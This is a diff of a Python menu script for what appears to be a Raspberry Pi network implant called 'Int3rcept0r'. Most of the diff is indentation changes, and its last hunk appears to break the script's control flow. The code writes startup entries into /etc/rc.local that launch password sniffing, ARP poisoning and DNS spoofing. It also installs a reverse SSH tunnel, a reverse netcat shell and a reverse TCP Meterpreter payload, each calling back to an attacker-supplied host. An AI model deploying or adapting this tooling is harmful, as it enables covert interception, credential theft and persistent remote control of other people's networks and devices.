@@ -7,20 +7,20 @@ class choice:
     def pas(self):
         temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/pas/pas.py &\nexit 0")
-	    open("/etc/rc.local", "w").write(temp)
+        open("/etc/rc.local", "w").write(temp)
         print("\nPassword_Sniffing Completed\n")
 
     def arp(self):
-	    temp = open("/etc/rc.local", "r").read()
+        temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/arp/arp.py &\nexit 0")
-	    open("/etc/rc.local", "w").write(temp)
-	    print("\nARP_Poisoning Completed\n")
+        open("/etc/rc.local", "w").write(temp)
+        print("\nARP_Poisoning Completed\n")
 
     def dns(self):
         open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
         open("/etc/hosts", "w").write(open("dns/hosts", "r").read())
-	    os.system("sudo service dnsmasq restart")
-	    print("\nDNS_Spoofing Completed\n")
+        os.system("sudo service dnsmasq restart")
+        print("\nDNS_Spoofing Completed\n")
 
     def dns_dnsmasq(self):
         open("/etc/dnsmasq.conf", "w").write(open("dns/dnsmasq/dnsmasq.conf", "r").read())
@@ -29,7 +29,7 @@ class choice:
         print("\nDnsmasq_DNS_Spoofing Completed\n")
         
     def rev_ssh(self):
-	    ip = input("Destination IP: ")
+        ip = input("Destination IP: ")
         vps_port = input("VPS Port (leave blank for default => 22): ")
         if vps_port == "":
             vps_port = 22
@@ -39,8 +39,8 @@ class choice:
         com = 'autossh -M 10387 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /home/pi/.ssh/id_rsa -R %s:localhost:22 restricted_user@%s -p %s &' % (tunnel_port,ip,vps_port)
         temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", com + "\nexit 0")
-	open("/etc/rc.local", "w").write(temp)
-	print("\nReverse_SSH Completed\n")
+        open("/etc/rc.local", "w").write(temp)
+        print("\nReverse_SSH Completed\n")
 
     def rev_net(self):
         ip = input("Destination IP: ")
@@ -49,11 +49,11 @@ class choice:
         open("rev_net/nc.sh", "w").write(com)
         temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", "/home/pi/Int3rcept0r/rev_net/nc.sh &" + "\nexit 0")
-	open("/etc/rc.local", "w").write(temp)
-	print("\nReverse_Netcat_Shell Completed\n")
+        open("/etc/rc.local", "w").write(temp)
+        print("\nReverse_Netcat_Shell Completed\n")
 
     def rev_met(self):
-	ip = input("Destination IP: ")
+        ip = input("Destination IP: ")
         port = input("Port: ")
         temp = open("met/default/shell.py","r").read()
         temp = temp.replace("host", ip).replace("l_port", port)
@@ -64,9 +64,9 @@ class choice:
         print("\nReverse_TCP_Meterpreter worked\n")
 
     def power_only(self):
-	os.system('sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"')
-	temp = open("/etc/rc.local", "r").read()
-	temp = temp.replace("iptables-restore < /etc/iptables.ipv4.nat", "")
+        os.system('sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"')
+        temp = open("/etc/rc.local", "r").read()
+        temp = temp.replace("iptables-restore < /etc/iptables.ipv4.nat", "")
         open("/etc/rc.local", "w").write(temp)
         print("\nPower_only Completed\n")
 
@@ -78,8 +78,8 @@ class choice:
         open("/etc/hosts", "w").write(open("default_files/etc/hosts", "r").read())
         os.system("sudo service dnsmasq restart")
         os.system("sudo iptables-restore < /etc/iptables.ipv4.nat")
-	os.system('sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
-	print("\nReset Completed\n")
+        os.system('sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
+        print("\nReset Completed\n")
 
 meth = int(input("""Please select which module to run
 
@@ -106,7 +106,7 @@ if meth < 0 or meth > 8:
 	print("Not a valid option!\n")
 else:
 	c = choice()
-    options = {0:c.pas,
+options = {0:c.pas,
                1:c.arp,
                2:c.dns,
                3:c.dns_dnsmasq,
@@ -115,5 +115,5 @@ else:
                6:c.rev_met,
                7:c.power_only,
                8:c.rst}
-    options[meth]()
+options[meth]()
 
